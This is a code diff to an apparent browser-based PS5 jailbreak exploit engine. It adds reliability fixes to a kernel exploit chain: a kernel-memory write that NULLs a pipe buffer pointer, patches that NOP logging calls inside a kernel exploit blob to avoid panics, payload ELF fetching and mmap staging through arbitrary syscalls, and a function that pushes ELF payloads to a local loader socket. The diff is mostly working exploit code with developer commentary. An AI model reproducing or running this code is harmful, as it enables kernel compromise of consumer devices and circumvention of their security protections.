@@ -8383,12 +8383,49 @@ export function makePoopsEngine(X) {
     }
   }
 
+  /* TEARDOWN PANIC GUARD - OPT-IN via ?nullpipe=1.
+   *
+   * stage5 points master.pipe_buffer.buffer at victim_pipe_data because kexp bootstraps its
+   * kernel r/w through that field. Nothing puts it back. victim_pipe_data was never carved
+   * out of pipe_map, so when the fd closes, pipeclose() inlines pipe_free_kmem(), calls
+   * vm_map_remove(pipe_map, buffer) on foreign memory and takes a Fatal trap 12.
+   *
+   * Navigating to the ELF loader page closes those fds, so the panic lands BEFORE that page
+   * renders. p2jb NULLs the field and does not panic; poopsploit does not and does.
+   *
+   * Must run AFTER kexp is finished - NULLing it earlier removes the primitive kexp is still
+   * reading through - which is why this sits in stage5's finally, not inside stage5Body.
+   *
+   * OFF BY DEFAULT. Retail and devkit work today; this writes kernel state on a live
+   * jailbreak, so it stays opt-in until it has hardware runs behind it. Without the flag the
+   * executed bytes are identical to before. */
+  async function nullMasterPipeBuf() {
+    if (!/[?&]nullpipe=1/i.test(String(location.search || ""))) return;
+    try {
+      if (!S.masterPipeData) { flushMark("NULLPIPE", "skipped-no-masterPipeData"); return; }
+      const before = await kread64Fast(S.masterPipeData.add32(0x10));
+      if (before.ret !== 8) { flushMark("NULLPIPE", "skipped-unreadable"); return; }
+      if (isZero64(before.v)) { flushMark("NULLPIPE", "already-zero"); return; }
+      const z = alloc(8, "nullpipe-zero");
+      w64(z.u8, 0, 0);
+      await kwriteFast(S.masterPipeData.add32(0x10), z, 8);
+      const after = await kread64Fast(S.masterPipeData.add32(0x10));
+      flushMark("NULLPIPE",
+        "was=" + hx(before.v) + "-now=" +
+        (after.ret === 8 ? hx(after.v) : "unreadable") +
+        "-ok=" + (after.ret === 8 && isZero64(after.v)));
+    } catch (e) {
+      flushMark("NULLPIPE", "failed-" + String((e && e.message) || e).slice(0, 60));
+    }
+  }
+
   async function stage5(opts) {
     const wasRace = setRaceMode(false);
     try {
       return await stage5Body(opts);
     } finally {
       setRaceMode(wasRace);
+      try { await nullMasterPipeBuf(); } catch (_) { }
     }
   }
 
@@ -8464,10 +8501,25 @@ export function makePoopsEngine(X) {
     try {
       const name = o.elfName || "elfldr-ps5-1360.elf";
       flushMark("STAGE5-HEAD-PRE", "url=../payloads/" + name);
-      const head = await fetch("payloads/" + name, { method: "HEAD" });
-      const declared = parseInt(head.headers.get("content-length") || "0", 10);
-      if (!(declared > 0)) throw new Error("no content-length for " + name);
-      flushMark("STAGE5-HEAD-OK", "declared=" + declared);
+        /* NEVER size this from Content-Length. GitHub Pages gzips the payloads, so a HEAD
+           there returns the COMPRESSED length (Content-Encoding: gzip) while fetch()
+           transparently inflates the GET - elfldr would be staged at a quarter of its real
+           size and the run would die at the very last stage, on the hosted site only.
+           HEAD was unreliable for a second reason too: a proxy can drop the header and a
+           chunked response has none, which produced "no content-length for
+           elfldr-ps5-1360.elf" with every earlier stage green.
+           jordyidk/slopkit and zecoxao/slopdev never use HEAD - they fetch the ELF and take
+           its .length. One request, and the size cannot disagree with the bytes. */
+        const r = await fetch("payloads/" + name, { cache: "no-store" });
+        if (!r.ok) throw new Error("GET " + name + " -> HTTP " + r.status);
+        const preBuf = new Uint8Array(await r.arrayBuffer());
+        const declared = preBuf.length;
+        flushMark("STAGE5-BYTES", name + "-bytes=" + declared + "-via=GET");
+      /* Sanity-bound the size before it becomes an mmap length - a bogus Content-Length would
+         otherwise be mapped verbatim. 16 MB is the reference's ceiling, ~40x the real elfldr. */
+      if (!(declared >= 4 && declared <= 0x1000000))
+        throw new Error("implausible size " + declared + " for " + name);
+      flushMark("STAGE5-HEAD-OK", "declared=" + declared + (preBuf ? "-prefetched" : ""));
       const mapped = (declared + PK.PAGE - 1) & ~(PK.PAGE - 1);
       const er = await sys(
         PSYS.MMAP,
@@ -8492,7 +8544,7 @@ export function makePoopsEngine(X) {
         "addr=" + hx(elfBase) + "-size=0x" + mapped.toString(16),
       );
       let head4 = null;
-      const g = await fetchInto("payloads/" + name, (off, chunk) => {
+      const stageChunk = (off, chunk) => {
         if (head4 === null) head4 = chunk.slice(0, 4);
 
         const base = elfBase.add32(off);
@@ -8507,7 +8559,12 @@ export function makePoopsEngine(X) {
               (chunk[i + 3] << 24),
           );
         for (; i < chunk.length; ++i) P.write1(base.add32(i), chunk[i]);
-      });
+      };
+      /* If the Content-Length fallback above already pulled the file, write those bytes
+         instead of fetching it a second time. */
+      const g = preBuf
+        ? (stageChunk(0, preBuf), { total: preBuf.length, streamed: false })
+        : await fetchInto("payloads/" + name, stageChunk);
       if (g.total !== declared)
         throw new Error(
           "size changed mid-fetch: declared " +
@@ -8628,10 +8685,45 @@ export function makePoopsEngine(X) {
     for (let i = 0; i < getpidTail.length; ++i)
       binBytes[0x10fb + i] = getpidTail[i];
     for (let i = 0x1101; i < 0x1106; ++i) binBytes[i] = 0x90;
+    /* ELFLDR-WINDOW LOG CALLS -> NOP.  (kernel-panic fix)
+     *
+     * The blob calls the same logging helper from three sites:
+     *     0x126D  e8 3ef6ffff -> 0x8B0
+     *     0x12AD  e8 fef5ffff -> 0x8B0
+     *     0x3BC2  e8 e9ccffff -> 0x8B0
+     * and 0x8B0 opens
+     *     push rbp ; mov rbp,rsp ; push r14 ; push rbx ; sub rsp, 0xD00
+     * i.e. a 3,328-byte frame. On the elfldr kernel thread that overruns the
+     * stack guard and the box dies with `vm_fault: fault on nofault entry` --
+     * a kernel panic, not a userland crash. slopkit NOPs these; our blob kept
+     * them.
+     *
+     * This fix already exists on the P2JB path (p2jb.js kexp_patch_resolver)
+     * but was never ported here, so every POOPSPLOIT run -- the whole
+     * 7.00-12.00 range -- still executed the blob with all three calls live.
+     * That is why a 10.20 console panics while 12.70 (which goes through
+     * p2jb.js) does not.
+     *
+     * Guarded three ways so it can only ever be a no-op if something differs:
+     *   - each site must still start with E8 (call rel32) before it is touched
+     *   - patching 5 bytes to 0x90 keeps the instruction stream length identical
+     *   - the count is reported, so 3/3 vs 0/3 is visible in the log
+     * The logging helper's only job is diagnostics; skipping it changes no
+     * kernel state the exploit depends on.
+     */
+    const KEXP_LOG_CALLS = [0x126d, 0x12ad, 0x3bc2];
+    let logNopped = 0;
+    for (const off of KEXP_LOG_CALLS) {
+      if (binBytes[off] !== 0xe8) continue;
+      for (let i = 0; i < 5; ++i) binBytes[off + i] = 0x90;
+      ++logNopped;
+    }
+
     flushMark(
       "STAGE5-RESOLVER-BYPASS",
       "payload=618f4b12-slots=11-getpid=" + hx(getpidAddress) +
-        "-dlsym-syscall-calls-skipped=12",
+        "-dlsym-syscall-calls-skipped=12" +
+        "-elfldr-log-calls-NOPed=" + logNopped + "/3",
     );
 
     const size = binBytes.length;
@@ -9157,6 +9249,105 @@ export function makePoopsEngine(X) {
     if (!out.ok) out.why = "Thrd_join returned " + tjRet;
     return out;
   }
+
+  /* Deliver an ELF to elfldr on 127.0.0.1:9021 from INSIDE the console, over a real
+     socket opened with syscalls, instead of asking the web server to open that TCP
+     connection for us via api/payload/<name>.
+
+     The server-side helper exists because BROWSER JavaScript has no raw sockets. That is
+     true before the jailbreak - but not after it: from stage 4 onward we have arbitrary
+     syscalls, and stage 5 already fetches an ELF over HTTP and mmaps it. So the page can
+     do the whole job itself: fetch the bytes, socket(), connect(), write(), close().
+
+     Consequence: the tile menu works on ANY host, including a purely static one such as
+     GitHub Pages, with no PHP/Node helper at all. Same sockaddr layout as the ps0
+     elfldr liveness probe above (len=16, AF_INET, port 9021 big-endian, 127.0.0.1). */
+  async function sendElfDirect(name) {
+    /* SIZE FROM THE BYTES, NOT FROM content-length.
+       GitHub Pages gzips these payloads, so a HEAD there reports the COMPRESSED length:
+           Content-Length: 51285   Content-Encoding: gzip      (the real ELF is 192320)
+       fetch() then transparently decompresses the GET, so sizing the mapping from that
+       header allocated a quarter of what actually arrived: the copy overran, the ELF
+       check failed, and the tile went red. Our own host does not compress, which is why
+       this only ever failed on the hosted site and never in local testing.
+       jordyidk/slopkit and zecoxao/slopdev both just read response.arrayBuffer() and use
+       its length - no HEAD, no content-length, nothing that can disagree with the bytes. */
+    const resp = await fetch("payloads/" + name, { cache: "no-store" });
+    if (!resp.ok) throw new Error("GET " + name + " -> " + resp.status);
+    const elfBytes = new Uint8Array(await resp.arrayBuffer());
+    const declared = elfBytes.length;
+    if (!(declared > 0)) throw new Error("empty payload " + name);
+
+    const mapped = (declared + PK.PAGE - 1) & ~(PK.PAGE - 1);
+    const mr = await sys(PSYS.MMAP, i64(0, 0), mapped, PK.PROT_RW,
+                         PK.MAP_ANON_PRIVATE, -1, i64(0, 0));
+    if (mr.failed || isZero64(mr.raw))
+      throw new Error("mmap 0x" + mapped.toString(16) + " failed: " + mr.errText);
+    const buf = mr.raw;
+
+    /* The bytes are already in hand, so copy them straight in - same writer as the old
+       streaming sink, just fed from the buffer instead of a reader. */
+    const first4 = elfBytes.slice(0, 4);
+    {
+      const base = buf;
+      let i = 0;
+      const n4 = declared & ~3;
+      for (; i < n4; i += 4)
+        P.write4(base.add32(i), elfBytes[i] | (elfBytes[i + 1] << 8) |
+                                (elfBytes[i + 2] << 16) | (elfBytes[i + 3] << 24));
+      for (; i < declared; ++i) P.write1(base.add32(i), elfBytes[i]);
+    }
+    /* elfldr rejects anything that is not an ELF at offset 0, so check before we spend a
+       socket on it - a 404 page fetched as an ELF would otherwise be written verbatim. */
+    if (!first4 || first4[0] !== 0x7f || first4[1] !== 0x45 ||
+        first4[2] !== 0x4c || first4[3] !== 0x46)
+      throw new Error("not an ELF (first4=" + (first4 ? Array.from(first4) : "none") + ")");
+
+    const sr = await sys(PSYS.SOCKET, K.AF_INET, K.SOCK_STREAM, 0);
+    if (sr.failed) throw new Error("socket: " + sr.errText);
+    const fd = sr.s32;
+    track(fd);
+
+    const ar = await sys(PSYS.MMAP, i64(0, 0), PK.PAGE, PK.PROT_RW,
+                         PK.MAP_ANON_PRIVATE, -1, i64(0, 0));
+    if (ar.failed || isZero64(ar.raw)) throw new Error("sockaddr mmap: " + ar.errText);
+    const sa = ar.raw;
+    P.write4(sa, 0x3d230210);            // sin_len=16, sin_family=AF_INET, sin_port=9021 BE
+    P.write4(sa.add32(4), 0x0100007f);   // 127.0.0.1
+    P.write4(sa.add32(8), 0);
+    P.write4(sa.add32(12), 0);
+
+    const cr = await sys(PSYS.CONNECT, fd, sa, 16);
+    if (cr.failed || cr.s32 !== 0) {
+      try { await sys(PSYS.CLOSE, fd); } catch (e) { }
+      throw new Error("connect(127.0.0.1:9021): " + cr.errText +
+                      " - is elfldr running?");
+    }
+
+    /* write() on a socket is allowed to return short, so loop until the whole image is
+       out. Chunked so a huge payload (etaHEN is ~4.7 MB) never sits in one giant call. */
+    let sent = 0;
+    while (sent < declared) {
+      const want = Math.min(0x40000, declared - sent);
+      const wr = await sys(PSYS.WRITE, fd, buf.add32(sent), want);
+      if (wr.failed) {
+        try { await sys(PSYS.CLOSE, fd); } catch (e) { }
+        throw new Error("write at " + sent + ": " + wr.errText);
+      }
+      const got = wr.s32 | 0;
+      if (got <= 0) {
+        try { await sys(PSYS.CLOSE, fd); } catch (e) { }
+        throw new Error("write returned " + got + " at " + sent);
+      }
+      sent += got;
+    }
+    await sys(PSYS.CLOSE, fd);
+    untrack(fd);
+    flushMark("PAYLOAD-DIRECT", name + "-ok=1-bytes=" + sent);
+    return sent;
+  }
+  /* Handed to the page so the static tile menu can call it without importing the module. */
+  try { window.__sendElfDirect = sendElfDirect; } catch (e) { }
 
   return {
     PK,
